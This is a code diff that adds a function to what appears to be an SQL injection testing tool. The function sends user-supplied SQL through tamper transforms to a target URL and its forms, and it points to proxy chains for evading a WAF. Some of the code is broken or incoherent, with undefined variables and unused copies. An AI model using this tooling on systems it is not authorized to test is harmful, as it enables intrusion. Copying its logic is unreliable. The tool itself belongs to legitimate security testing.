@@ -1094,3 +1094,70 @@ def time_based_heavy_q(url):
             
             if count > 0 and "HTTPConnectionPool" in str(e):
                 logger.error(e)
+
+
+def sqlQuery(sql=arg.sqlQuery,url=arg.url):
+        try:
+
+            _ = update_url(url,sql)
+            __url = _
+            if verbose > 3:
+                logger.debug(__url)
+            _payload = apply_tamper(sql)
+            _ = update_url(url,_payload)
+            print(PAYLOAD_SENDING.SENDING%sql if verbose >= 3 else "")
+
+            __url = _
+            response = requests.get(__url)
+            if verbose > 5:
+                logger.debug("status code %d"%response.status_code)
+            logger.info("testing :%s"%Payload.TIME_BASED_HEAVY_Q.value+"\033[1m\033[0m")
+            logger.debug(response.text if verbose >= 5 else "")
+            forms = get_all_forms(url)
+            for form in forms:
+                form_data = {}
+                for input_field in form.find_all('input'):
+                    form_data[input_field.get('name')] = input_field.get('value', '')
+                    form_data_copy = form_data.copy()
+                    payload_field_name = sql 
+                    form_data_copy[payload_field_name] = _payload
+                    if input_field.get("name") == sql:
+                        input_field["value"] = _payload
+                        __url = update_url(url)
+                        break
+                if response.status_code == 500:
+                    logger.warning("The server has encountered status code error 500.this might be a sql injection vulnerability on %s,this can also occur due to the server erros.if you believe that this is a WAF/IPS protection, you can use advacned tools or use proxy chains."%url)
+
+                response_content = response.text
+                form_in_response = get_form_from_response(response_content)
+                form_details = get_form_details(form_in_response)
+
+                sql_injection_basic_detection(form_in_response, form_details)
+                if is_sql_injection_vulnerable(response_content):
+                    logger.warning("Potential sql injection detected!!!")
+                    if arg.beep:
+                        __import__("extras.beep.beep")
+                    logger.info("%s parameter is %s injectable"%(parameter,time_based_heavy_q.__name__+"eury"))
+                    logger.warning("found potential sql injection on %s"%url)
+                    logger.warning("payload:%s"%sql)
+                    logger.warning("url: %s"%__url)
+                    logger.warning("program will be resume the injection after %d seconds"%delay_time)
+                    logger.debug("response: %s"%response_content)
+                    conf.keyword = extract_some_keyword(__url)
+                    conf.vuln = True
+                    time.sleep(delay_time)
+
+                    # Call sql_injection_basic_detection with both parameters
+                    sql_injection_basic_detection(form_in_response, form_details)
+                    if arg.beep:
+                        __import__("extras.beep.beep")
+                
+
+        except Exception as e:
+            count = 0
+            if any(["HTTPConnectionPool" in str(e)]):
+                count += 1
+            
+            if count > 0 and "HTTPConnectionPool" in str(e):
+                logger.error(e)
+
